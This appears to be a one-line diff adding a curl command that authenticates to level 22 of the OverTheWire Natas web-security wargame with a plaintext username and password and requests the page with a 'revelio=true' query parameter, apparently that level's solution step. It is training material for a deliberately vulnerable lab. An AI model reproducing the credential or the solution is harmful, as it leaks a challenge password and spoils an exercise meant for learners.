@@ -1,0 +1,1 @@
+curl --user natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ --include http://natas22.natas.labs.overthewire.org\?revelio\=true
